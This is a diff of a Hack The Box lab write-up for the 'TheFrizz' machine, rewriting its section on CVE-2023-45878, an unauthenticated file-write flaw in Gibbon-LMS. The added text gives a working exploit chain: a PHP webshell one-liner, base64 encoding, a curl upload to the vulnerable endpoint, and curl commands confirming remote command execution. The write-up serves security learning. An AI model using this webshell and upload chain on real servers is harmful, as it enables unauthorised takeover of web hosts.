@@ -68,15 +68,64 @@ Ran `gobuster` against the Gibbon-LMS application for anything interesting.
 ---
 
 ## Initial Access (Web → Shell)
-### CVE-2023-45878 (Gibbon-LMS Arbitrary File Write)
 
-While researching the Gibbon-LMS version, I found CVE-2023-45878, an unauthenticated arbitrary file write vulnerability in `modules/Rubrics/rubrics_visualise_saveAjax.php`.  
+### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  
 
-The endpoint expects a base64-encoded image in the `img` parameter, but it simply:
-1) extracts everything after the comma,  
-2) base64-decodes it, and  
-3) writes the result to disk using a user-controlled filename (`path`).  
+While enumerating the Gibbon-LMS instance, I identified CVE-2023-45878 in the endpoint:
 
-Because the application does **no content validation and no file extension restrictions**, we can base64-encode PHP code and save it as `shell.php`, giving us remote command execution through the web server.
-![](assets/img/htb/thefrizz/thefrizz10.png)
+modules/Rubrics/rubrics_visualise_saveAjax.php
+
+The vulnerability exists because the application accepts a “base64 image” via the `img` parameter, but it:
+
+- does not require authentication,  
+- does not validate that the content is actually an image, and  
+- writes the decoded content to disk using a **user-controlled filename (`path`)**.
+
+This allows an attacker to disguise PHP code as image data, have the server decode it, and force it to be written as a `.php` file in the web root — resulting in remote code execution.
+
+#### Build the payload locally
+
+I created a minimal PHP webshell that executes any command passed via `?cmd=`:
+
+`echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`
+
+#### Encode it for upload
+
+Because the endpoint expects base64 data, I encoded the file:
+
+`b64=$(base64 -w0 shell.php)`
+![](assets/img/htb/thefrizz/thefrizz12.png)
+#### Upload the webshell
+
+I then abused the vulnerable endpoint to write the file to the server:
+
+`curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
+![](assets/img/htb/thefrizz/thefrizz14.png)
+
+What each parameter does:
+
+- `img=image/png;asdf,${b64}`  
+  The server splits on the comma, base64-decodes everything on the right, and writes it to disk.  
+  The `image/png;asdf` portion is just filler to satisfy the parser.
+
+- `path=shell.php`  
+  Controls the output filename. Because extensions are not restricted, I can choose `.php`.
+
+- `gibbonPersonID=0000000001`  
+  A required application field that influences where the file is saved.
+
+If the upload succeeds, the endpoint echoes the filename back:
+
+`shell.php%`
+
+#### Verify remote code execution
+
+I accessed the uploaded shell directly:
+
+`curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=whoami"`
+![](assets/img/htb/thefrizz/thefrizz13.png)
+`frizz\w.webservice`
+
+This confirms remote command execution on the web server.
+
 
